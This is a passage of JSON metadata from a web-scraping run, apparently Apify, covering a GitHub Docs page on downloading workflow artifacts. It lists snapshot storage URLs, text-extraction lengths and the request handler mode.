    "response": {},
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-downloading-workflow-artifacts-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-downloading-workflow-artifacts-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-downloading-workflow-artifacts-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-downloading-workflow-artifacts-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-workflow-runs-downloading-workflow-artifacts-readableTextIfPossible"
    },
    "lengths": {
      "extractus": 1839,
      "readableText": 1174,
      "none": 6200,
      "readableTextIfPossible": 6200,
      "result": 1174,
      "markdown": 812
    },
    "requestHandlerMode": "http"
  }
}]